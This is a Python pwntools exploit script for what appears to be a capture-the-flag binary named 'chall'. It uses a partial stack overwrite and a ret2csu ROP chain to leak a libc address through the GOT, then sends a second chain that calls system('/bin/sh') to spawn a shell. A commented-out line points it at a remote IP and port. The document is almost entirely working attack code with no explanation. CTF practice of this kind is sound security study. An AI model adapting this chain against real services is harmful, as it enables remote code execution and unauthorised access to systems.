from pwn import *

context.binary = exe = ELF('./chall')
libc = ELF('./libc.so.6')

csu_gadget1 = 0x4013da # pop rbx, rbp, r12, r13, r14, r15
csu_gadget2 = 0x4013c0 # r14->rdx, r13->rsi, r12->edi, call r15, add rsp,8
# rbp = 1, rbx = 0
pop_rdi = 0x4013e3
ret = pop_rdi+1

while(1):
    io = process()
    #gdb.attach(io, api=True)
    #io = remote('34.101.68.243', 10001)

    libc.address = 0

    io.recvuntil(b'to: ')
    io.send(b'a'*24 + b'\xd8')

    io.recvuntil(b'send: ')
    payload = p64(csu_gadget1)
    payload += p64(0) + p64(1) + p64(1) + p64(1) + p64(exe.got['syscall']) + p64(exe.got['syscall']) # Read /bin/sh string
    payload += p64(csu_gadget2) + p64(0)

    payload += p64(0) + p64(1) + p64(59) + p64(exe.bss(0x100)) + p64(0) + p64(exe.got['syscall']) # Call execve
    payload += p64(exe.sym['main'])

    io.sendline(payload)
    #io.interactive()
    
    try:
        io.recvuntil(b'sent!\n')
        libc.address = u64(io.recv(8)) - libc.sym['syscall']
        one = libc.address + 0xe3b01
        bin_sh = libc.address + 0x1b45bd

        print('Libc base:', hex(libc.address))

        io.recvuntil(b'to: ')
        io.send(b'a'*24 + b'\xf8')

        io.recvuntil(b'send: ')
        payload = p64(pop_rdi) + p64(bin_sh) + p64(libc.sym['system'])
        payload = p64(ret)*((128-len(payload))//8) + payload
        io.sendline(payload)

        #io.sendline(b'/bin/sh\0')
        io.interactive()
        io.close()
    except:
        io.close()
